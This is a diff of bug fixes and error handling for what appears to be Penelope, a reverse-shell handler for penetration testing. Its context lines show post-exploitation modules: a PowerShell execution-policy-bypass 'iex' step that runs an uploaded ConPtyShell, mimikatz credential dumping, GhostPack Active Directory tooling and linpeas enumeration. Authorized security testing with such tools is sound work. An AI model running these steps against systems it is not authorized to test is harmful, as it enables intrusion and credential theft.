@@ -73,9 +73,6 @@ from string import ascii_letters
 from random import choice, randint
 rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
 caller = lambda: inspect.stack()[2].function
-def bdebug(file, data):
-	with open("/tmp/" + file, "a") as f:
-		f.write(repr(data) + "\n")
 chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
 pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
 normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
@@ -384,7 +381,7 @@ class Interfaces:
 		if busybox:
 			params.insert(0, 'busybox')
 		for line in subprocess.check_output(params).decode().splitlines():
-			interface = re.search(r"^\d+: (.+?):", line)
+			interface = re.search(r"^\d+: (.+?)(?:@\S+)?:", line)
 			if interface:
 				current_interface = interface[1]
 				continue
@@ -402,16 +399,20 @@ class Interfaces:
 
 	@property
 	def list(self):
-		if shutil.which("ip"):
-			interfaces = self.ipa()
+		try:
+			if shutil.which("ip"):
+				interfaces = self.ipa()
 
-		elif shutil.which("ifconfig"):
-			interfaces = self.ifconfig()
+			elif shutil.which("ifconfig"):
+				interfaces = self.ifconfig()
 
-		elif shutil.which("busybox"):
-			interfaces = self.ipa(busybox=True)
-		else:
-			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
+			elif shutil.which("busybox"):
+				interfaces = self.ipa(busybox=True)
+			else:
+				logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
+				return dict()
+		except (subprocess.CalledProcessError, OSError) as e:
+			logger.error(f"Failed to enumerate interfaces: {e}")
 			return dict()
 
 		return {i[0]:i[1] for i in interfaces}
@@ -574,7 +575,7 @@ class PBar:
 			self.speed = self.pos - self.pos_prev
 			self.pos_prev = self.pos
 			self.speed_avg = self.pos / self.elapsed
-			if self.speed_avg: self.eta = int(self.end / self.speed_avg) - self.elapsed
+			if self.speed_avg: self.eta = max(0, int(self.end / self.speed_avg) - self.elapsed)
 			if self: self.render()
 
 	def update(self, step=1):
@@ -592,7 +593,10 @@ class PBar:
 		speed = "" if not hasattr(self, 'speed') else f" | {self.metric(self.speed)}/s"
 		eta = "" if not hasattr(self, 'eta') else f" | ETA {timedelta(seconds=self.eta)}"
 		right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
-		bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
+		try:
+			bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
+		except OSError:
+			bar_space = self.barlen or 40
 		bars = int(self.percent * bar_space / 100) * self.bar
 		print(f'\x1b[2K{left}{bars.ljust(bar_space, ".")}{right}\n', end='', flush=True)
 
@@ -681,7 +685,7 @@ class CustomFormatter(logging.Formatter):
 		suffix = "\r\n"
 
 		if core.wait_input:
-			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()
+			suffix += bytes(core.output_line_buffer).decode() + (readline.get_line_buffer() if readline else '')
 
 		elif core.attached_session:
 			suffix += bytes(core.output_line_buffer).decode()
@@ -1017,6 +1021,10 @@ class MainMenu(BetterCMD):
 						else:
 							cmdlogger.warning("No available sessions to perform this action")
 							return False
+					if self.sid not in core.sessions:
+						cmdlogger.warning(f"Session {self.sid} is no longer active")
+						self.sid = None
+						return False
 				else:
 					if ID:
 						if ID.isnumeric() and int(ID) in core.sessions:
@@ -1257,7 +1265,7 @@ class MainMenu(BetterCMD):
 					return False
 			session.kill()
 
-		if options.single_session and len(core.sessions) == 1:
+		if options.single_session and not core.sessions:
 			core.stop()
 			logger.info("Penelope exited due to Single Session mode")
 			return True
@@ -1560,7 +1568,11 @@ class MainMenu(BetterCMD):
 		if session.OS == 'Unix':
 			session.upgrade()
 		else:
-			conptyshell_path = session.upload(URLS['conptyshell'], remote_path=session.tmp)[0]
+			result = session.upload(URLS['conptyshell'], remote_path=session.tmp)
+			if not result:
+				cmdlogger.error("Failed to upload ConPtyShell")
+				return
+			conptyshell_path = result[0]
 			shell_type = 'cmd' if session.subtype == 'cmd' else 'powershell'
 			session.exec(
 				f"powershell -nop -ep bypass -c \"iex(get-content {conptyshell_path} -raw); "
@@ -2242,7 +2254,7 @@ def handle_bind_errors(func):
 	return wrapper
 
 def Connect(host, port):
-
+	_socket = None
 	try:
 		port = int(port)
 		_socket = socket.socket()
@@ -2270,6 +2282,11 @@ def Connect(host, port):
 		if session:
 			return True
 
+	if _socket is not None:
+		try:
+			_socket.close()
+		except OSError:
+			pass
 	return False
 
 class TCPListener:
@@ -2938,10 +2955,11 @@ class Session:
 
 		elif self.OS == 'Windows':
 			response = self.exec("whoami", force_cmd=True, value=True)
-			if "\n" in response:
-				response = response.splitlines()[-1] # conptyshell
-			if '\x07' in response:
-				response = response.split('\x07')[-1] # conptyshell cmd
+			if response:
+				if "\n" in response:
+					response = response.splitlines()[-1] # conptyshell
+				if '\x07' in response:
+					response = response.split('\x07')[-1] # conptyshell cmd
 
 		return response or ''
 
@@ -3062,9 +3080,16 @@ class Session:
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
-						self._bin = dict(zip(binaries, response.decode().splitlines()))
+						lines = response.decode().splitlines()
+						if len(lines) >= len(binaries):
+							self._bin = dict(zip(binaries, lines))
+						else:
+							logger.debug(f"Binary discovery: got {len(lines)} lines, expected {len(binaries)}")
+							for i, b in enumerate(binaries):
+								if i < len(lines):
+									self._bin[b] = lines[i]
 
-					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]
+					missing = [b for b in binaries if not os.path.isabs(self._bin.get(b, ''))]
 
 					if missing:
 						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
@@ -3079,10 +3104,10 @@ class Session:
 				for binary in options.no_bins:
 					self._bin[binary] = None
 
-				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
+				result = "\n".join([f"{b}: {self._bin.get(b, '')}" for b in binaries])
 				logger.debug(f"Available binaries on target: \n{paint(result).red}")
-			except:
-				pass
+			except Exception as e:
+				logger.debug(f"Binary discovery failed: {e}")
 
 		return self._bin
 
@@ -3602,13 +3627,19 @@ class Session:
 			answer = ask("Select action: ")
 
 			if answer == "1":
-				return self.upload(url, remote_path="/var/tmp")[0]
+				result = self.upload(url, remote_path="/var/tmp")
+				if result:
+					return result[0]
+				logger.error("Upload failed")
 
 			elif answer == "2":
 				local_path = ask(f"Enter {name} local path: ")
 				if local_path:
 					if os.path.exists(local_path):
-						return self.upload(local_path, remote_path=self.tmp)[0]
+						result = self.upload(local_path, remote_path=self.tmp)
+						if result:
+							return result[0]
+						logger.error("Upload failed")
 					else:
 						logger.error("The local path does not exist...")
 
@@ -3762,7 +3793,7 @@ class Session:
 		if self.OS == 'Unix':
 			if self.agent:
 				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
-			else: # TODO
+			elif self.tty: # TODO
 				threading.Thread(
 					target=self.exec,
 					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
@@ -4580,6 +4611,8 @@ class Session:
 				program = first_line[2:].decode()
 			else:
 				logger.error("No shebang found")
+				input_file.close()
+				output_file.close()
 				return False
 
 			tail_cmd = f'tail -n+0 -f {output_file_name}'
@@ -5270,10 +5303,15 @@ class peass_ng(Module):
 					return False
 
 			output_file = session.script(URLS['linpeas'])
+			if not output_file:
+				logger.error("Failed to run linpeas")
+				return
 
 			if arguments.ai:
 				api_key = input("Please enter your chatGPT API key: ")
-				assert len(api_key) > 10
+				if len(api_key) <= 10:
+					logger.error("API key too short")
+					return
 
 				with open(output_file, "r") as file:
 					content = file.read()
@@ -5367,7 +5405,6 @@ class upload_credump_scripts(Module):
 			logger.error("This module runs only on Windows shells")
 
 		elif session.OS == 'Windows':
-			import tempfile
 			_, archive = url_to_bytes(URLS['mimikatz'])
 			if not archive:
 				logger.error("Failed to download mimikatz")
@@ -5417,7 +5454,11 @@ class upload_ad_scripts(Module):
 			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 				with zipfile.ZipFile(io.BytesIO(archive)) as z:
 					z.extractall(tmpdir)
-					extracted_folder = list(Path(tmpdir).iterdir())[0]
+					contents = list(Path(tmpdir).iterdir())
+					if not contents:
+						logger.error("GhostPack archive extraction yielded no files")
+						return
+					extracted_folder = contents[0]
 					renamed_folder = extracted_folder.parent / "ghostpack"
 					os.rename(extracted_folder, renamed_folder)
 					session.upload(str(renamed_folder))
@@ -5433,7 +5474,11 @@ class uac(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
+			result = session.upload(URLS['uac_linux'], remote_path=session.tmp)
+			if not result:
+				logger.error("Failed to upload UAC")
+				return False
+			path = result[0]
 			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
 			if not result:
 				logger.info(f"UAC successfully extracted on {session.tmp}")
@@ -5892,6 +5937,8 @@ class FileServer:
 			self.httpd.serve_forever()
 
 	def stop(self):
+		if not hasattr(self, 'id'):
+			return
 		del core.fileservers[self.id]
 		if not self.quiet:
 			logger.warning(f"Shutting down Fileserver #{self.id}")
@@ -5998,6 +6045,9 @@ def url_to_bytes(URL):
 				pbar.terminate()
 			logger.error(e)
 			return None, None
+
+	if size:
+		pbar.terminate()
 
 	return filename, data
 
